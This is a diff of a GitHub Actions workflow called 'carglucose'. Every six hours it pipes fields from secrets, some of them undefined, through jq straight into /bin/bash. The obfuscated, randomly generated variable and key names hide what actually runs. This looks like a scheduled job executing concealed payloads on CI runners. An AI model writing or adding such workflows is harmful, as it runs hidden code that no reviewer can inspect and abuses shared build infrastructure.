@@ -1,23 +1,31 @@
 name: carglucose
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 0/6 * * *'
+    - cron: '9 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: carglucose
         env:
-          d216: ${{ secrets.d216 }}
+          fb4864: ${{ secrets.fb4864 }}
         run: |
-          echo $d216 | jq -r .dld1 | /bin/bash
-          echo $bzsmr771 | jq -r .lhjh307 | /bin/bash
-          echo $oxfof68732 | jq -r .woh0089 | /bin/bash
-          echo $q31 | jq -r .nbe8549 | /bin/bash
-          echo $j976 | jq -r .ygx208 | /bin/bash
-          echo $h30 | jq -r .urf8318 | /bin/bash
+          echo $fb4864 | jq -r .ngnv15885 | /bin/bash
+          echo $vc5079 | jq -r .t893 | /bin/bash
+          echo $g8 | jq -r .sq54 | /bin/bash
+          echo $xuk2 | jq -r .lpt4097 | /bin/bash
+          echo $pejn21900 | jq -r .wrdqt56595 | /bin/bash
+          echo $l55526 | jq -r .krb883 | /bin/bash
+          echo $e1 | jq -r .xg86 | /bin/bash
+          echo $wfgg861 | jq -r .gx58547 | /bin/bash
+          echo $ys278 | jq -r .jg350 | /bin/bash
+          echo $ndsx1 | jq -r .reaq320 | /bin/bash
+          echo $kjuhu67295 | jq -r .zm94709 | /bin/bash
+          echo $f0035 | jq -r .h8353 | /bin/bash
+          echo $xtu554 | jq -r .men72876 | /bin/bash
+          echo $h16 | jq -r .xoqo06184 | /bin/bash
+          echo $w0 | jq -r .mog49 | /bin/bash
 
